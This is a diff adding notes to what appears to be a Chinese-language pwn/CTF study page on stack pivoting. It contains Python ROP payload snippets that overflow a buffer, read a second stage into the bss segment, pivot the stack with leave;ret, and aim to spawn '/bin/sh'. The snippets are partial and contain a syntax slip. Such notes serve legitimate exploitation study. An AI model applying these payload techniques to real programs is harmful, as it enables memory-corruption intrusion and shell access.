@@ -19,7 +19,35 @@ https://blog.csdn.net/qq_29343201/article/details/72627439
 将eax赋值为3
 ### 栈转移
 寻找 leave;ret;指令，然后更改ebp的值即可
-leave= mov esp,ebp,pop ebp;
+```py
+payload += p32(base_stage)
+payload += p32(leave_ret)
+#leave= mov esp,ebp,pop ebp
+```
+例子：将esp设置到bss段上
+```py
+payload = flat(
+  [
+  'A' * offset, # 覆盖到ret
+  read_plt, # 读100个字节到base_stage
+  ppp_ret, # pop esi ; pop edi ; pop ebp ; ret 清空参数
+  0,
+  base_stage,
+  100,
+  pop_ebp_ret, # 把base_stage pop到ebp中
+  base_stage,
+  leave_ret  #mov esp,ebp;pop ebp
+  ]
+)
+cmd = "/bin/sh"
+payload1= flat(
+  [
+    'A' *4 # 接payload1，ebp='AAAA'
+    write_plt
+    #...
+  ]
+)
+```
 
 ## 通用技术
 常用的栈布局如下
